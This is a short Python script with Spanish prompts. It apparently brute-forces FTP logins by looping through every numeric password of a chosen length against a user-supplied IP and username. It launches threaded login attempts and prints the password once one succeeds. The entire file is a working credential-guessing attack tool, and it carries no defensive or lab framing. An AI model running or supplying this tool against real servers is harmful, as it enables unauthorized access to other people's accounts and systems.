import ftplib
import sys
from colorama import init,Fore
init()
import threading
from threading import Thread
import time
from time import perf_counter

i=0
contra=""

def comprobar(passW):
	global usuario
	global ip
	global contra
	try:
		ftp=ftplib.FTP(ip)
		ftp.login(usuario,passW)
		ftp.quit()
		contra=passW
	except Exception as e:
		if str(e) != "530 User cannot log in.":
			print(e)
		pass

def info():
	while True:
		time.sleep(2)
		print(chr(27) + "[2J")
		print("[-]La fuerza bruta va por el número " + str(i).zfill(digitos) + " (" + str(i*100/numeroMax)[:4] + "%)")
		if contra!="":
			contador2 = perf_counter()
			print(Fore.GREEN + "[+]" +  Fore.RESET + "Login correcto con pass: " + contra)
			print(Fore.GREEN + "[+]" +  Fore.RESET + "Tiempo transcurrido:", contador2-contador1, "segundos")
			sys.exit()

def hilo():
	global i
	passAComprobar = str(i).zfill(digitos)
	i += 1
	comprobar(passAComprobar)
		
#--Principal
datos = input("[-] Inserte los datos (IP, USUARIO, Y DÍGITOS DE LA CONTRASEÑA) con el siguiente formato; IP-USUARIO-DÍGITOS: ")
contador1 = perf_counter()

datos=datos.split("-")

ip=datos[0]
usuario=datos[1]
digitos=int(datos[2])

numeroMax=int("9"*digitos)

threads = []

a = threading.Thread(target=info) #Inicio de hilo de información
threads.append(a)
a.start()

while contra=="": #Hilos
	time.sleep(0.001)
	for t in range(2):
		thread = Thread(target=hilo)
		thread.daemon = True
		thread.start()
